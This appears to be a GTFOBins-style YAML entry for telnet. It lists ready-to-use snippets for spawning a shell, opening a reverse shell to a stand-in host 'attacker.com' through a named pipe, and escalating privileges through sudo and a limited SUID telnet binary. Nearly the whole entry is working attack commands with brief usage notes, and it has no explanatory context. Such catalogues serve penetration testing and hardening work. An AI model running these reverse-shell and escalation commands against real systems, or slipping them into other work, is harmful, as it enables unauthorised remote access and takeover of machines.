---
functions:
  shell:
    - description: BSD version only. Needs to be connected first.
      code: |
        RHOST=attacker.com
        RPORT=12345
        telnet $RHOST $RPORT
        ^]
        !/bin/sh
  reverse-shell:
    - description: Run `nc -l -p 12345` on the attacker box to receive the shell.
      code: |
        RHOST=attacker.com
        RPORT=12345
        TF=$(mktemp -u)
        mkfifo $TF && telnet $RHOST $RPORT 0<$TF | /bin/sh 1>$TF
  sudo:
    - description: BSD version only. Needs to be connected first.
      code: |
        RHOST=attacker.com
        RPORT=12345
        sudo telnet $RHOST $RPORT
        ^]
        !/bin/sh
  limited-suid:
    - description: BSD version only. Needs to be connected first.
      code: |
        RHOST=attacker.com
        RPORT=12345
        ./telnet $RHOST $RPORT
        ^]
        !/bin/sh
---
